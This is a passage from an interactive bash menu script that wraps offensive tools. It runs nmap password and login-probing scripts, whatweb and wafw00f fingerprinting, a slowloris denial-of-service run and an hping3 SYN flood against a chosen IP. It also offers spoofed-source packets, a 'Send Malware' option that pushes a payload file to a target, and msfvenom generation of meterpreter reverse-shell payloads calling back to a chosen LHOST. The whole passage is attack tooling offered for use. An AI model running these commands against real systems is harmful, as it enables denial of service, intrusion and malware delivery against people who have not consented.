                                                            printf "${WHITE}Executing command: ${YELLOW}nmap $FLAG -sV --script ${PURPLE}http-frontpage-login${YELLOW} -p ${PURPLE}$PORT${YELLOW} ${CYAN}$IP${YELLOW} ${FILENAME:+-oN /home/$USER/$FOLDER/$FILENAME}n\n"
                                                            echo -e "${NC}-------------------------------------------${NC}"
                                                            nmap $FLAG -sV --script http-frontpage-login -p$PORT $IP ${FILENAME:+-oN /home/$USER/$FOLDER/$FILENAME};printf "\n";unset FILENAME;
                                                    else
                                                            clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n"
                                                            printf "${WHITE}Executing command: ${YELLOW}nmap $FLAG -sV --script ${PURPLE}http-frontpage-login${YELLOW} ${CYAN}$IP${YELLOW} ${FILENAME:+-oN /home/$USER/$FOLDER/$FILENAME} \n\n"
                                                            echo -e "${NC}-------------------------------------------${NC}"
                                                            nmap $FLAG -sV --script http-frontpage-login $IP ${FILENAME:+-oN /home/$USER/$FOLDER/$FILENAME};printf "\n";unset FILENAME;
                                                    fi;; 

                                        4) 

                                            while [[ $IP == ""  ]]
                                            do      
                                                    printf "${WHITE}";printf "Insert Target IP Address(${YELLOW}ex: 10.10.10.1 or 10.10.10.0/24${WHITE}):\n";printf "${NC}";
                                                    read -e  IP;
                                                    printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                    printf "${WHITE}";printf "Insert Port(${YELLOW}ex: 80,443${WHITE}):\n";printf "${NC}";
                                                    read -e  PORT;
                                                    printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n"
                                                    printf "${WHITE}";printf "Insert FLAG:\n";printf "${NC}";
                                                    read -e  FLAG;
                                                    printf "${WHITE}Flag: ${YELLOW}$FLAG${WHITE}\n\n"
                                                    printf "${WHITE}";printf "Insert File Name:\n";printf "${NC}";
                                                    read -e  FILENAME;
                                                    printf "${WHITE}Filename: ${YELLOW}$$FILENAME${WHITE}\n\n"
                                                    if [[ -n "$FILENAME" ]]; then
                                                    printf "${WHITE}Filename: ${YELLOW}$FILENAME${WHITE}\n\n"
                                                    fi
                                                    echo -e "${NC}-------------------------------------------${NC}\n"              

                                            done
                                                    if [[ $PORT != "" ]]
                                                    then    
                                                            clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n";printf "${WHITE}Port: ${YELLOW}$PORT\n\n"
                                                            printf "${WHITE}Executing command: ${YELLOW}nmap $FLAG -sV --script ${PURPLE}http-passwd${YELLOW} -script-args ${PURPLE}http-passwd.root${YELLOW} -p ${PURPLE}$PORT${YELLOW} ${CYAN}$IP${YELLOW} ${FILENAME:+-oN /home/$USER/$FOLDER/$FILENAME}\n\n"
                                                            echo -e "${NC}-------------------------------------------${NC}"
                                                            nmap $FLAG -sV --script http-passwd --script-args http-passwd.root -p$PORT $IP ${FILENAME:+-oN /home/$USER/$FOLDER/$FILENAME};printf "\n";unset FILENAME;
                                                    else
                                                            clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n"
                                                            printf "${WHITE}Executing command: ${YELLOW}nmap $FLAG -sV -script ${PURPLE}http-passwd${YELLOW} -script-args ${PURPLE}http-passwd.root${YELLOW} ${CYAN}$IP${YELLOW} ${FILENAME:+-oN /home/$USER/$FOLDER/$FILENAME}\n\n"
                                                            echo -e "${NC}-------------------------------------------${NC}"
                                                            nmap $FLAG -sV --script http-passwd --script-args http-passwd.root $IP ${FILENAME:+-oN /home/$USER/$FOLDER/$FILENAME} ;printf "\n";unset FILENAME;
                                                    fi;; 

                                        5) 

                                            while [[ $IP == "" ]]
                                            do      
                                                    printf "${WHITE}";printf "Insert Target IP Address(${YELLOW}ex: 10.10.10.1 or 10.10.10.0/24${WHITE}):\n";printf "${NC}";
                                                    read -e  IP;
                                                    printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                    printf "${WHITE}";printf "Insert Port(${YELLOW}ex: 80,443${WHITE}):\n";printf "${NC}";
                                                    read -e  PORT;
                                                    printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n"
                                                    printf "${WHITE}";printf "Insert FLAG:\n";printf "${NC}";
                                                    read -e  FLAG;
                                                    printf "${WHITE}Flag: ${YELLOW}$FLAG${WHITE}\n\n"
                                                    printf "${WHITE}";printf "Insert File Name:\n";printf "${NC}";
                                                    read -e  FILENAME;
                                                    printf "${WHITE}Filename: ${YELLOW}$$FILENAME${WHITE}\n\n"
                                                    if [[ -n "$FILENAME" ]]; then
                                                    printf "${WHITE}Filename: ${YELLOW}$FILENAME${WHITE}\n\n"
                                                    fi
                                                    echo -e "${NC}-------------------------------------------${NC}\n"              

                                            done
                                                    if [[ $PORT != "" ]]
                                                    then    
                                                            clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n";printf "${WHITE}Port: ${YELLOW}$PORT\n\n"
                                                            printf "${WHITE}Executing command: ${YELLOW}nmap $FLAG -sV --script ${PURPLE}http-errors.nse${YELLOW} -p ${PURPLE}$PORT${YELLOW} ${CYAN}$IP${YELLOW} ${FILENAME:+-oN /home/$USER/$FOLDER/$FILENAME}\n\n"
                                                            echo -e "${NC}-------------------------------------------${NC}"
                                                            nmap $FLAG -sV --script http-errors.nse -p$PORT $IP ${FILENAME:+-oN /home/$USER/$FOLDER/$FILENAME};printf "\n";unset FILENAME;
                                                    else
                                                            clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n"
                                                            printf "${WHITE}Executing command: ${YELLOW}nmap $FLAG -sV --script ${PURPLE}http-errors.nse${YELLOW} ${CYAN}$IP${YELLOW} ${FILENAME:+-oN /home/$USER/$FOLDER/$FILENAME}\n\n"
                                                            echo -e "${NC}-------------------------------------------${NC}"
                                                            nmap $FLAG -sV --script http-errors.nse $IP ${FILENAME:+-oN /home/$USER/$FOLDER/$FILENAME} ;printf "\n";unset FILENAME
                                                    fi;;

                                        6) 

                                            while [[ $IP == "" ]]
                                            do      
                                                    printf "${WHITE}";printf "Insert Target IP Address(${YELLOW}ex: 10.10.10.1 or 10.10.10.0/24${WHITE}):\n";printf "${NC}";
                                                    read -e  IP;
                                                    printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                    printf "${WHITE}";printf "Insert Port(${YELLOW}ex: 80,443${WHITE}):\n";printf "${NC}";
                                                    read -e  PORT;
                                                    printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n"
                                                    printf "${WHITE}";printf "Insert FLAG:\n";printf "${NC}";
                                                    read -e  FLAG;
                                                    printf "${WHITE}Flag: ${YELLOW}$FLAG${WHITE}\n\n"
                                                    printf "${WHITE}";printf "Insert File Name:\n";printf "${NC}";
                                                    read -e  FILENAME;
                                                    printf "${WHITE}Filename: ${YELLOW}$$FILENAME${WHITE}\n\n"
                                                    if [[ -n "$FILENAME" ]]; then
                                                    printf "${WHITE}Filename: ${YELLOW}$FILENAME${WHITE}\n\n"
                                                    fi
                                                    echo -e "${NC}-------------------------------------------${NC}\n"               

                                            done
                                                    if [[ $PORT != "" ]]
                                                    then    
                                                            clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n";printf "${WHITE}Port: ${YELLOW}$PORT\n\n"
                                                            printf "${WHITE}Executing command: ${YELLOW}nmap $FLAG -sV --script ${PURPLE}http-enum,http-frontpage-login,http-passwd${YELLOW} -script-args ${PURPLE}http-passwd.root${YELLOW} -p ${PURPLE}$PORT${YELLOW} ${CYAN}$IP${YELLOW} ${FILENAME:+-oN /home/$USER/$FOLDER/$FILENAME}\n\n"
                                                            echo -e "${NC}-------------------------------------------${NC}"
                                                            nmap $FLAG -sV --script http-enum,http-frontpage-login,http-passwd --script-args http-passwd.root -p$PORT $IP ${FILENAME:+-oN /home/$USER/$FOLDER/$FILENAME};printf "\n";unset FILENAME;
                                                    else
                                                            clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n"
                                                            printf "${WHITE}Executing command: ${YELLOW}nmap $FLAG -sV -script ${PURPLE}http-enum,http-frontpage-login,http-passwd${YELLOW} -script-args ${PURPLE}http-passwd.root${YELLOW} ${CYAN}$IP${YELLOW} ${FILENAME:+-oN /home/$USER/$FOLDER/$FILENAME}\n\n"
                                                            echo -e "${NC}-------------------------------------------${NC}"
                                                            nmap $FLAG -sV --script http-enum,http-frontpage-login,http-passwd --script-args http-passwd.root $IP ${FILENAME:+-oN /home/$USER/$FOLDER/$FILENAME} ;printf "\n";unset FILENAME;
                                                    fi;;


                                        7)
                                                    clear;
                                                    printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n";printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n"
                                                    echo -e "${NC}-------------------------------------------${NC}\n";;                                             

                                        8)
                                                    clear; 
                                                    printf "${WHITE}Insert Target IP:\n${NC}"
                                                    read -e  IP;printf "\n"
                                                    printf "${WHITE}Insert Target Port:\n${NC}"
                                                    read -e  PORT;printf "\n"
                                                    clear;
                                                    printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                    printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n"
                                                    echo -e "${NC}-------------------------------------------${NC}\n";;                                             

                                        9)
                                                    clear;
                                                    printf "Values Cleared!\n\n"
                                                    echo -e "${NC}-------------------------------------------${NC}\n"
                                                    unset IP
                                                    unset FILENAME;
                                                    unset PORT;;

                                        0)     
                                                clear;
                                                break;;

                                    esac
                                done;;

                           4) 

                                while : ; do

                                printf "${WHITE}Select An Option:${NC}\n\n"
                                echo -e "${CYAN}1. Nmap ${NC}"
                                echo -e "${CYAN}2. WhatWeb ${NC}"
                                echo -e "${CYAN}3. Wafw00f ${NC}"
                                echo -e "${GREEN}4. Show Target ${NC}"
                                echo -e "${GREEN}5. Set Target ${NC}"
                                echo -e "${GREEN}6. Clear Target ${NC}"
                                echo -e "${YELLOW}0. Back ${NC}\n"
                                echo -n -e "${RED}Enter selection [0-7]: ${NC}"
                                printf ${WHITE};
                                read -e  -r firewall;
                                printf "\n";clear;



                                    case $firewall in 

                                        1)
                                            
                                            while [[ $IP == "" ]]
                                            do      
                                                    printf "${WHITE}";printf "Insert Target IP Address(${YELLOW}ex: 10.10.10.1 or 10.10.10.0/24${WHITE}):\n";printf "${NC}";
                                                    read -e  IP;
                                                    printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                    printf "${WHITE}";printf "Insert Port(${YELLOW}ex: 80,443${WHITE}):\n";printf "${NC}";
                                                    read -e  PORT;
                                                    printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n"
                                                    printf "${WHITE}";printf "Insert FLAG:\n";printf "${NC}";
                                                    read -e  FLAG;
                                                    printf "${WHITE}Flag: ${YELLOW}$FLAG${WHITE}\n\n"
                                                    printf "${WHITE}";printf "Insert File Name:\n";printf "${NC}";
                                                    read -e  FILENAME;
                                                    printf "${WHITE}Filename: ${YELLOW}$FILENAME${WHITE}\n\n"
                                                    if [[ -n "$FILENAME" ]]; then
                                                    printf "${WHITE}Filename: ${YELLOW}$FILENAME${WHITE}\n\n"
                                                    fi
                                                    echo -e "${NC}-------------------------------------------${NC}\n"               

                                            done
                                                    if [[ $PORT != "" ]]
                                                    then    
                                                            clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n";printf "${WHITE}Port: ${YELLOW}$PORT\n\n"
                                                            printf "${WHITE}Executing command: ${YELLOW}nmap $FLAG -sV --script ${PURPLE}http-waf-detect${YELLOW} -p ${PURPLE}$PORT${YELLOW} ${CYAN}$IP${YELLOW} ${FILENAME:+-oN /home/$USER/$FOLDER/$FILENAME}\n\n"
                                                            echo -e "${NC}-------------------------------------------${NC}"
                                                            nmap $FLAG -sV --script http-waf-detect -p$PORT $IP ${FILENAME:+-oN /home/$USER/$FOLDER/$FILENAME};printf "\n";unset FILENAME;
                                                    else
                                                            clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n"
                                                            printf "${WHITE}Executing command: ${YELLOW}nmap $FLAG -sV --script ${PURPLE}http-waf-detect${YELLOW} ${CYAN}$IP${YELLOW} ${FILENAME:+-oN /home/$USER/$FOLDER/$FILENAME}\n\n"
                                                            echo -e "${NC}-------------------------------------------${NC}"
                                                            nmap $FLAG -sV --script http-waf-detect $IP ${FILENAME:+-oN /home/$USER/$FOLDER/$FILENAME};printf "\n";unset FILENAME;
                                                    fi;; 

                                        2) 
                                            while [[ $IP == "" ]]
                                            do      
                                                    printf "${WHITE}";printf "Insert Target IP Address:\n";printf "${NC}";
                                                    read -e  IP;
                                                    printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                    echo -e "${NC}-------------------------------------------${NC}\n"               

                                            done
                                                    clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n"
                                                    printf "${WHITE}Executing command: ${YELLOW}whatweb ${CYAN}$IP${YELLOW} -v \n\n"
                                                    echo -e "${NC}-------------------------------------------${NC}"
                                                    whatweb $IP -v ;printf "\n";;                                      

                                        3) 
                                            while [[ $IP == "" ]]
                                            do      
                                                    printf "${WHITE}";printf "Insert Target IP Address:\n";printf "${NC}";
                                                    read -e  IP;
                                                    printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                    echo -e "${NC}-------------------------------------------${NC}\n"               

                                            done
                                                    clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n"
                                                    printf "${WHITE}Executing command: ${YELLOW}wafw00f ${CYAN}$IP${YELLOW} -v \n\n"
                                                    echo -e "${NC}-------------------------------------------${NC}"
                                                    wafw00f $IP -v ;printf "\n";;    


                                        4)
                                                    clear;
                                                    printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                    echo -e "${NC}-------------------------------------------${NC}\n";;                                             

                                        5)
                                                    clear; 
                                                    printf "${WHITE}Insert Target IP:\n"${NC}
                                                    read -e  IP;printf "\n"
                                                    clear;
                                                    printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                    echo -e "${NC}-------------------------------------------${NC}\n";;                                             

                                        6)
                                                    clear;
                                                    printf "Target Cleared!\n\n"
                                                    echo -e "${NC}-------------------------------------------${NC}\n"
                                                    unset IP;;

                                        0)     
                                                clear;
                                                break;;


                                    esac    


                                done;;

                        5)
                                clear;
                                printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n";
                                echo -e "${NC}-------------------------------------------${NC}\n";;                                             

                        6)
                                clear; 
                                printf "${WHITE}Insert Target IP:\n${NC}"
                                read -e  IP;printf "\n"
                                clear;
                                printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                echo -e "${NC}-------------------------------------------${NC}\n";;                         

                        7)
                                clear;
                                printf "Values Cleared!\n\n"
                                echo -e "${NC}-------------------------------------------${NC}\n"
                                unset IP;;

                        0)     
                                clear;
                                break;;

                        esac
                        
                done;;    


#slowloris
            7) 
                clear;

                    if [[ $IP != "" && $PORT != "" ]]
                    then
                            clear;printf "${WHITE}TARGET: ${YELLOW}$IP\n\n";printf "${WHITE}PORT: ${YELLOW}$PORT\n\n"
                            printf "${WHITE}Executing command: ${YELLOW}slowloris.pl -dns ${PURPLE}$IP${YELLOW} -port ${PURPLE}$PORT ${YELLOW}-https -test \n\n"
                            echo -e "${NC}-------------------------------------------${NC}"
                            slowloris.pl -dns $IP -port $PORT -https -test ;printf "\n"
                    else
                            printf "${WHITE}";printf "Insert Target IP Address:\n";printf "${NC}";
                            read -e  IP;
                            printf "${WHITE}";printf "\nInsert Port:\n";printf "${NC}";
                            read -e  PORT;
                            clear;printf "${WHITE}TARGET: ${YELLOW}$IP${WHITE}\n\n";printf "PORT: ${YELLOW}$PORT\n\n${NC}"
                            printf "${WHITE}Executing command: ${YELLOW}slowloris.pl -dns ${PURPLE}$IP${YELLOW} -port ${PURPLE}$PORT ${YELLOW}-https -test \n\n"
                            echo -e "${NC}-------------------------------------------${NC}" 
                            slowloris.pl -dns $IP -port $PORT -https -test ;printf "\n"
                    fi;;
#hping3
            8)
                while : ; do

                    printf "${WHITE}Select An Option:${NC}\n\n"
                    echo -e "${CYAN}1. System Uptime Disclosure ${NC}"
                    echo -e "${CYAN}2. SYN Flood ${NC}"
                    echo -e "${CYAN}3. Spoof IP ${NC}" 
                    echo -e "${CYAN}4. Port Scan ${NC}"
                    echo -e "${CYAN}5. Send Malware ${NC}"
                    echo -e "${GREEN}6. Show Values ${NC}"
                    echo -e "${GREEN}7. Set Values ${NC}"
                    echo -e "${GREEN}8. Clear Values ${NC}"
                    echo -e "${YELLOW}0. Back ${NC}\n"
                    echo -n -e "${RED}Enter selection [0-8]: ${NC}"
                    printf ${WHITE};read -e  -r hping;
                    printf "\n";clear;

                        case $hping in

                                1)
                                    clear;
                                    while [[  $IP == "" || $PORT == "" ]]
                                    do
                                            printf "${WHITE}Insert Target IP Address:\n";printf "${NC}";
                                            read -e  IP;
                                            printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                            printf "${WHITE}";printf "Insert Port:\n";printf "${NC}";
                                            read -e  PORT;
                                            printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n"
                                            echo -e "${NC}-------------------------------------------${NC}" 
                                            printf "\n"
                                    done
                                            clear;printf "${WHITE}TARGET: ${YELLOW}$IP${WHITE}\n\n";printf "PORT: ${YELLOW}$PORT\n\n${NC}"
                                            printf "${WHITE}Executing command: ${YELLOW}hping3 --count 5 --syn --destport ${PURPLE}$PORT${YELLOW} --tcp-timestamp ${PURPLE}$IP\n\n" 
                                            echo -e "${NC}-------------------------------------------${NC}" 
                                            sudo hping3 --count 5 --syn --destport $PORT --tcp-timestamp $IP;printf "\n";;


                                2)
                                    clear; 
                                    while [[ $IP == "" ]]
                                    do
                                            printf "${WHITE}";printf "Insert Target IP Address:\n";printf "${NC}";
                                            read -e  IP;
                                            printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                            echo -e "${NC}-------------------------------------------${NC}" 
                                            printf "\n"
                                    done
                                            printf "${WHITE}TARGET: ${YELLOW}$IP\n\n"
                                            printf "${WHITE}Executing command: ${YELLOW}hping3 -S --flood -V ${PURPLE}$IP\n\n"
                                            echo -e "${NC}-------------------------------------------${NC}"
                                            sudo hping3 -S --flood -V $IP;printf "\n";;



                                3)
                                    clear;
                                    while [[ $IP == "" || $SPOOFED == "" ]]
                                    do
                                            printf "${WHITE}";printf "Insert IP Address:\n";printf "${NC}";
                                            read -e  IP;
                                            printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                            printf "${WHITE}";printf "Insert Spoofed IP Address:\n";printf "${NC}";
                                            read -e  SPOOFED;
                                            printf "${WHITE}Spoofed IP: ${YELLOW}$SPOOFED${WHITE}\n\n"
                                            echo -e "${NC}-------------------------------------------${NC}\n"
                                            
                                    done
                                            printf "${WHITE}TARGET: ${YELLOW}$IP\n\n";printf "${WHITE}SPOOFED IP: ${YELLOW}$SPOOFED${NC}\n\n${NC}"
                                            printf "${WHITE}Executing command: ${YELLOW}hping3 $PURPLE$IP${YELLOW} -a ${PURPLE}$SPOOFED\n\n"
                                            echo -e "${NC}-------------------------------------------${NC}\n"
                                            sudo hping3 $IP -a $SPOOFED;printf "\n";;
      

                                4)
                                    clear;
                                    while [[ $IP == "" || $PORT == "" ]]
                                    do
                                            printf "${WHITE}";printf "Insert Target IP Address:\n";printf "${NC}";
                                            read -e  IP;
                                            printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                            printf "${WHITE}";printf "Insert Port: Or A Range (${YELLOW}ex: 1-1024${WHITE}):\n";printf "${NC}";
                                            read -e  PORT;
                                            printf "${WHITE}Port Range: ${YELLOW}$PORT${WHITE}\n\n"
                                            echo -e "${NC}-------------------------------------------${NC}\n"
                                    done
                                            clear;printf "${WHITE}TARGET: ${YELLOW}$IP\n\n";printf "${WHITE}PORT: ${YELLOW}$PORT\n\n"
                                            printf "${WHITE}Executing command: ${YELLOW}hping3 --scan ${PURPLE}$PORT${YELLOW} -S ${PURPLE}$IP\n\n"
                                            echo -e "${NC}-------------------------------------------${NC}"
                                            sudo hping3 --scan $PORT -S $IP;printf "\n";;

                                5)
                                    clear;
                                    while [[ $IP == "" ]] || [[ $PORT == "" ]] || [[ payloadDATA  == "" ]] || [[ fragmentationData == "" ]]
                                    do
                                            printf "${WHITE}";printf "Insert Target IP Address:\n";printf "${NC}";
                                            read -e  IP;
                                            printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                            printf "${WHITE}";printf "Insert Port:\n";printf "${NC}";
                                            read -e  PORT;
                                            printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n"
                                            printf "${WHITE}";printf "Insert Payload (${YELLOW}ex: /home../payload.exe${WHITE}):\n";printf "${NC}";
                                            read -e  payloadDATA;
                                            printf "${WHITE}Payload: ${YELLOW}$payloadDATA${WHITE}\n\n"
                                            printf "${WHITE}";printf "Insert Fragmentation Data (${YELLOW}ex: 100)${PURPLE}:\n";printf "${NC}";
                                            read -e  fragmentationData;
                                            printf "${WHITE}Fragmentation Data: ${YELLOW}$fragmentationData${WHITE}\n\n"                                            
                                            echo -e "${NC}-------------------------------------------${NC}"
                                            printf "\n"
                                    done
                                            clear;printf "${WHITE}TARGET: ${YELLOW}$IP${WHITE}\n\n";printf "PORT: ${YELLOW}$PORT\n\n"; printf "${WHITE}PAYLOAD: ${YELLOW}$payloadDATA\n\n";printf "${WHITE}DATA: ${YELLOW}$fragmentationData\n\n${NC}"
                                            printf "${WHITE}Executing command: ${YELLOW}hping3 -f ${PURPLE}$IP${YELLOW} -p $PURPLE$PORT${YELLOW} -d ${PURPLE}$fragmentationData${YELLOW} -E ${PURPLE}$payloadDATA \n\n"
                                            printf "${CYAN}Where:\n\n-d is the data payload size (here, we've designated it as 100 bytes)\n\n-E tells hping3 to grab data from the following file \n\n"
                                            echo -e "${NC}-------------------------------------------${NC}" 
                                            printf "\n"
                                            sudo hping3 -f $IP -p $PORT -d $fragmentationData -E "$payloadDATA";printf "\n";;

                                6)
                                    clear;
                                    printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n";printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n";printf "${WHITE}Spoofed IP: ${YELLOW}$SPOOFED${WHITE}\n\n";printf "${WHITE}Payload: ${YELLOW}$payloadDATA${WHITE}\n\n";printf "${WHITE}Fragmentation Data: ${YELLOW}$fragmentationData${WHITE}\n\n";
                                    echo -e "${NC}-------------------------------------------${NC}\n";;

                                7)
                                    clear;
                                    while [[ $IP == "" || $PORT == "" ]]
                                    do           
                                            printf "${WHITE}Insert Target IP:\n${NC}"
                                            read -e  IP;printf "\n"
                                            printf "${WHITE}Insert Port:\n${NC}"
                                            read -e  PORT;printf "\n"
                                            printf "${WHITE}Insert Spoofed IP:\n${NC}"
                                            read -e  SPOOFED;printf "\n"
                                            printf "${WHITE}Insert Payload:\n${NC}"
                                            read -e  payloadDATA;printf "\n"
                                            printf "${WHITE}Insert Fragmentation Data:\n${NC}"
                                            read -e  fragmentationData;printf "\n"
                                            clear;
                                    done
                                            printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n";printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n";printf "${WHITE}Spoofed IP: ${YELLOW}$SPOOFED${WHITE}\n\n";printf "${WHITE}Payload: ${YELLOW}$payloadDATA${WHITE}\n\n";printf "${WHITE}Fragmentation Data: ${YELLOW}$fragmentationData${WHITE}\n\n";
                                            echo -e "${NC}-------------------------------------------${NC}\n";;    

                                8)
                                    clear;
                                    printf "Values Cleared!\n\n"
                                    echo -e "${NC}-------------------------------------------${NC}\n"
                                    unset IP;unset PORT; unset SPOOFED;unset fragmentationData; unset payloadDATA;;


                                0)
                                    clear;
                                    break;;
                    
                        esac

                done;;
          
#nslookup
            9)
                if [[ $IP == "" ]]
                then
                        echo "Enter a IP address:"
                        printf "${NC}";read -e  IP;     
                        clear;nslookup $IP;
                        unset IP;printf "${WHITE}";printf "\nIP Cleared - Information Above\n";printf "${NC}"
                else
                        nslookup $IP;
                        printf "\nIP: $IP\n";
                fi;;

#dig
            10)
                if [[ $IP == "" ]]
                then
                        echo "Enter a IP address:"
                        printf "${NC}";read -e  IP;        
                        clear;dig $IP ANY;
                        unset IP;printf "${WHITE}";printf "\nIP Cleared - Information Above\n";printf "${NC}"
                else
                        dig $IP ANY;
                        printf "\nIP: $IP\n";
                fi;;
#whois
            11)
                if [[ $IP == "" ]]
                then
                        echo "Enter a IP address:"
                        printf "${NC}";read -e  IP;
                        clear;whois $IP;printf "\n";
                        unset IP;printf "${WHITE}";printf "\nTarget Cleared  - Information Above\n";printf "${NC}"
                else
                        whois $IP;printf "\n";
                        printf "IP: $IP\n";
                fi;;

#metasploit
            12)
                terminator -e "sudo msfconsole";;


#payload creator
            13)

                while : ; do

                    printf "${YELLOW}Welcome To Payload Creator\n\n"
                    printf "${WHITE}Select An Option:${NC}\n\n"
                    echo -e "${CYAN}1. BURN ${NC}"
                    echo -e "${GREEN}2. Payload List ${NC}"
                    echo -e "${GREEN}3. Search For A Payload ${NC}"
                    echo -e "${GREEN}4. Insert Values ${NC}"
                    echo -e "${GREEN}5. Show Values ${NC}"
                    echo -e "${GREEN}6. Clear Values ${NC}"
                    echo -e "${YELLOW}0. Back ${NC}\n"
                    echo -n -e "${RED}Enter selection [0-6]: ${NC}"
                    printf ${WHITE};read -e  -r payloadCreation;
                    printf "\n";clear;

                        case $payloadCreation in

                                1)  
                                    while [[ $PAYLOAD == "" || $NAME == "" || LHOST == "" || LPORT == "" || $EXTENSION == "" ]]
                                    do
                                            printf "${WHITE}Insert Payload Name:\n${NC}"
                                            read -e  NAME;printf "\n"
                                            printf "${WHITE}Insert LHOST:\n${NC}"
                                            read -e  LHOST;printf "\n"
                                            printf "${WHITE}Insert LPORT:\n${NC}"
                                            read -e  LPORT;printf "\n"
                                            printf "${WHITEs}Insert Payload (${YELLOW}ex: windows/meterpreter_reverse_tcp or linux/x86/meterpreter/bind_tcp ${WHITE}):\n${NC}"
                                            read -e  PAYLOAD;printf "\n"
                                            printf "${WHITE}Insert Extension:\n${NC}"
                                            read -e  EXTENSION;printf "\n"
                                            clear;
                                    done

                                    printf "${WHITE}Payload Name: ${YELLOW}$NAME${WHITE}\n\n";printf "${WHITE}LHOST: ${YELLOW}$LHOST${WHITE}\n\n";printf "${WHITE}LPORT: ${YELLOW}$LPORT${WHITE}\n\n";printf "${WHITE}Payload: ${YELLOW}$PAYLOAD${WHITE}\n\n";printf "${WHITE}Extension: ${YELLOW}$EXTENSION${WHITE}\n\n";
                                    printf "${WHITE}Executing command: ${YELLOW}msfvenom -p ${PURPLE}$PAYLOAD${YELLOW} LHOST=${PURPLE}$LHOST${YELLOW} LPORT=${PURPLE}$LPORT${YELLOW} -f ${PURPLE}$EXTENSION${YELLOW} > ${PURPLE}/home/$USER/$NAME.$EXTENSION${YELLOW} \n\n"
                                    echo -e "${NC}-------------------------------------------${NC}\n"
                                    msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -f $EXTENSION > /home/$USER/$NAME.$EXTENSION
                                    unset NAME;unset LHOST; unset LPORT;unset PAYLOAD; unset EXTENSION
                                    printf "\n";;

                                2) 
                                    terminator -e "sudo msfconsole '-x show payloads'";;

                                3)
                                    while [[ $msfpayload == "" ]]
                                    do
                                        printf "${WHITE}Insert A Payload Name (${YELLOW}ex: payload/linux or payload/windows${WHITE}):\n"${NC}
                                        read -e  msfpayload;
                                        clear;
                                    done
                                        terminator -e "sudo msfconsole '-x search $msfpayload'"
                                        unset msfpayload;;     

                                4) 
                                    clear;
                                    while [[ $PAYLOAD == "" || $NAME == "" || LHOST == "" || LPORT == "" || $EXTENSION == "" ]]
                                    do           
                                            printf "${WHITE}Insert Payload Name:\n${NC}"
                                            read -e  NAME;printf "\n"
                                            printf "${WHITE}Insert LHOST:\n${NC}"
                                            read -e  LHOST;printf "\n"
                                            printf "${WHITE}Insert LPORT:\n${NC}"
                                            read -e  LPORT;printf "\n"
                                            printf "${WHITE}Insert Payload (${YELLOW}ex: windows/meterpreter_reverse_tcp or linux/x86/meterpreter/bind_tcp ${WHITE}):\n${NC}"
                                            read -e  PAYLOAD;printf "\n"
                                            printf "${WHITE}Insert Extension:\n${NC}"
                                            read -e  EXTENSION;printf "\n"
                                            clear;
                                    done
                                            printf "${WHITE}Payload Name: ${YELLOW}$NAME${WHITE}\n\n";printf "${WHITE}LHOST: ${YELLOW}$LHOST${WHITE}\n\n";printf "${WHITE}LPORT: ${YELLOW}$LPORT${WHITE}\n\n";printf "${WHITE}Payload: ${YELLOW}$PAYLOAD${WHITE}\n\n";printf "${WHITE}Extension: ${YELLOW}$EXTENSION${WHITE}\n\n";
                                            echo -e "${NC}-------------------------------------------${NC}\n";;    

                                5)
                                    clear;
                                    printf "${WHITE}Payload Name: ${YELLOW}$NAME${WHITE}\n\n";printf "${WHITE}LHOST: ${YELLOW}$LHOST${WHITE}\n\n";printf "${WHITE}LPORT: ${YELLOW}$LPORT${WHITE}\n\n";printf "${WHITE}Payload: ${YELLOW}$PAYLOAD${WHITE}\n\n";printf "${WHITE}Extension: ${YELLOW}$EXTENSION${WHITE}\n\n";
                                    echo -e "${NC}-------------------------------------------${NC}\n";;

                                6)
                                    clear;
                                    printf "Values Cleared!\n\n"
                                    echo -e "${NC}-------------------------------------------${NC}\n"
                                    unset NAME;unset LHOST; unset LPORT;unset PAYLOAD; unset EXTENSION;;


                                0)
                                    clear;
                                    break;;
                        esac


                done;;


#searchsploit
            14) 
                clear; 
                printf "Search for an exploit:${YELLOW}\n";
                read -e  exploit;printf "\n${NC}"
                searchsploit $exploit;;

#enum4linux
            15)
                clear;
                if [[ $IP != "" ]]
                then
                        clear;printf "${WHITE}TARGET: ${YELLOW}$IP\n\n"
